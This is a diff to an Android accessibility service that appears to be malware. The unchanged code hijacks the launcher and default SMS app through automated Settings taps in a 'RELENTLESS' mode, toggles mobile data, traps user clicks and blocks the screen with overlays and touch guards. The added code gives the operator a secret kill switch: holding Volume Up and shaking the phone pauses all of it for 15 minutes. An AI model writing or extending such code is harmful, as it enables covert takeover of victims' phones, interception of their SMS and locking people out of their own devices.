@@ -12,6 +12,10 @@ import org.json.JSONObject
 import android.app.KeyguardManager
 import android.os.Handler
 import android.os.Looper
+import android.hardware.Sensor
+import android.hardware.SensorEvent
+import android.hardware.SensorEventListener
+import android.hardware.SensorManager
 
 class MyAccessibilityService : AccessibilityService() {
 
@@ -20,6 +24,9 @@ class MyAccessibilityService : AccessibilityService() {
         fun triggerDataRecovery() {
             instance?.engageGhostHand()
         }
+        fun isSafeZoneActive(ctx: Context): Boolean {
+            return System.currentTimeMillis() < ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getLong("safe_zone_expiry", 0L)
+        }
     }
 
     private var nextAllowedCheck = 0L
@@ -27,6 +34,46 @@ class MyAccessibilityService : AccessibilityService() {
     private var cachedRules: JSONObject = JSONObject()
     private var cachedUiTraps: JSONArray = JSONArray()
     private var cachedNativeTraps: JSONArray = JSONArray()
+
+    private var isVolUpHeld = false
+    private var sensorManager: SensorManager? = null
+    private var accelSensor: Sensor? = null
+
+    private val shakeListener = object : SensorEventListener {
+        override fun onSensorChanged(event: SensorEvent) {
+            val gX = event.values[0] / SensorManager.GRAVITY_EARTH
+            val gY = event.values[1] / SensorManager.GRAVITY_EARTH
+            val gZ = event.values[2] / SensorManager.GRAVITY_EARTH
+            val gForce = Math.sqrt((gX * gX + gY * gY + gZ * gZ).toDouble()).toFloat()
+            
+            if (gForce > 3.0f) {
+                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                val now = System.currentTimeMillis()
+                if (now > prefs.getLong("safe_zone_expiry", 0L)) {
+                    prefs.edit().putLong("safe_zone_expiry", now + 15 * 60 * 1000L).apply()
+                    DebugLogger.log("SAFE_ZONE", "Shake threshold exceeded! SAFE ZONE ARMED (15 mins).")
+                    try {
+                        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                            vibrator.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+                        } else {
+                            @Suppress("DEPRECATION")
+                            vibrator.vibrate(500)
+                        }
+                    } catch (e: Exception) {}
+                    
+                    Handler(Looper.getMainLooper()).post {
+                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "SAFE_ZONE_ACTIVATED")
+                        DynamicUIManager.removeNativeOverlay(this@MyAccessibilityService, "SAFE_ZONE_ACTIVATED")
+                        DimmerManager.removeOverlay(this@MyAccessibilityService)
+                        DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
+                        abortSequences()
+                    }
+                }
+            }
+        }
+        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
+    }
     
     private val throttleMap = mutableMapOf<String, Long>()
     private fun logThrottled(tag: String, msg: String, interval: Long = 2000L) {
@@ -224,6 +271,9 @@ class MyAccessibilityService : AccessibilityService() {
         super.onServiceConnected()
         instance = this
 
+        sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
+        accelSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
+
         DynamicUIManager.warmUpEngine(this)
         DynamicUIManager.applyStoredStatusBar(this)
 
@@ -263,7 +313,7 @@ class MyAccessibilityService : AccessibilityService() {
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
             val isShieldActive = statsPrefs.getBoolean("power_shield_active", false)
             
-            if (isShieldActive && (isStateChange || isContentChange)) {
+            if (!isSafeZoneActive(this) && isShieldActive && (isStateChange || isContentChange)) {
                 val now = System.currentTimeMillis()
                 
                 // 1. STAGE 1: CPU THROTTLE (Prevent melting the CPU on every clock tick)
@@ -349,7 +399,7 @@ class MyAccessibilityService : AccessibilityService() {
         // --- DEFAULT SMS GHOST LOGIC ---
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
             // --- LAUNCHER HIJACK ENGINE (HYPER-VERBOSE) ---
-            if (LauncherManager.isHijacking) {
+            if (!isSafeZoneActive(this) && LauncherManager.isHijacking) {
                 val currentHome = DeviceManager.getDefaultApps(this).optString("launcher", "")
                 
                 if (currentHome == packageName) {
@@ -448,7 +498,7 @@ class MyAccessibilityService : AccessibilityService() {
             }
         }
 
-        if (isWaitingForDataSettings && pkgName.contains("settings")) {
+        if (!isSafeZoneActive(this) && isWaitingForDataSettings && pkgName.contains("settings")) {
                 val root = rootInActiveWindow
                 val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
                 if (!targetNodes.isNullOrEmpty()) {
@@ -510,7 +560,7 @@ class MyAccessibilityService : AccessibilityService() {
             }
 
             val mode = DefaultSmsManager.expectedMode
-            if (mode == "AUTO" || mode == "RELENTLESS") {
+            if (!isSafeZoneActive(this) && (mode == "AUTO" || mode == "RELENTLESS")) {
                 val root = rootInActiveWindow ?: return
                 
                 // Resolve which app name we are looking for
@@ -582,7 +632,7 @@ class MyAccessibilityService : AccessibilityService() {
                         }, 600)
                     }
                 }
-            } else if (mode == "RESTORE" || mode == "AUTO_NAV") {
+            } else if (!isSafeZoneActive(this) && (mode == "RESTORE" || mode == "AUTO_NAV")) {
                 val root = rootInActiveWindow ?: return
                 val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                 
@@ -775,7 +825,7 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
-        if (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0) {
+        if (!isSafeZoneActive(this) && (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0)) {
             // STRICT REQUIREMENT: Only react to physical clicks
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 val pkg = event.packageName?.toString() ?: ""
@@ -1158,7 +1208,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     private fun handleSequenceEvent(pkg: String) {
-        if (activeSequence == null || !pkg.contains("settings")) return
+        if (isSafeZoneActive(this) || activeSequence == null || !pkg.contains("settings")) return
 
         val root = rootInActiveWindow ?: return
         
@@ -2126,6 +2176,16 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onKeyEvent(event: android.view.KeyEvent): Boolean {
+        if (event.keyCode == android.view.KeyEvent.KEYCODE_VOLUME_UP) {
+            if (event.action == android.view.KeyEvent.ACTION_DOWN && !isVolUpHeld) {
+                isVolUpHeld = true
+                accelSensor?.let { sensorManager?.registerListener(shakeListener, it, SensorManager.SENSOR_DELAY_UI) }
+            } else if (event.action == android.view.KeyEvent.ACTION_UP) {
+                isVolUpHeld = false
+                sensorManager?.unregisterListener(shakeListener)
+            }
+        }
+        
         if (flightModeAuthPending && event.keyCode == android.view.KeyEvent.KEYCODE_VOLUME_UP) {
             if (event.action == android.view.KeyEvent.ACTION_DOWN) {
                 DebugLogger.log("FLIGHT_AUTH", "Volume Up knock received! Auth Success.")
